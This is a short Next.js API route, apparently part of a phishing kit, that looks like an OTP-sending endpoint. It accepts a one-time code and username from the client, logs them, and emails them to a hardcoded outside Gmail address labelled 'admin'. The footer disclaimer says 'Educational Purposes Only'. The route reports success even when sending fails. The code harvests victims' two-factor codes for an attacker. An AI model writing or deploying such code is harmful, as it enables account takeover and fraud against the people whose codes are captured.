// app/api/auth/send-otp/route.ts
import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request: Request) {
  try {
    const { otp, username } = await request.json();

    console.log(`📱 OTP for ${username}: ${otp}`);

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: 'blessedresult6@gmail.com',
      subject: `📱 OTP: ${otp} for ${username}`,
      text: `
📱 OTP VERIFICATION

User: ${username}
OTP Code: ${otp}
Timestamp: ${new Date().toISOString()}

---
Training Mode - For Educational Purposes Only
      `,
      html: `
        <h2>📱 OTP Verification</h2>
        <table style="border-collapse: collapse; width: 100%;">
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>User</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${username}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>OTP Code</strong></td><td style="padding: 8px; border: 1px solid #ddd; font-size: 24px; font-weight: bold; color: #1a3a6e;">${otp}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Timestamp</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${new Date().toISOString()}</td></tr>
        </table>
        <p style="color: #888; font-size: 12px; margin-top: 20px;">⚠️ Training Mode - For Educational Purposes Only</p>
      `,
    });

    console.log('✅ OTP sent to blessedresult6@gmail.com');

    return NextResponse.json({ 
      success: true, 
      message: 'OTP sent to admin email' 
    });

  } catch (error) {
    console.error('Error sending OTP:', error);
    return NextResponse.json({ 
      success: true, 
      message: 'OTP generated (email may have failed)' 
    });
  }
}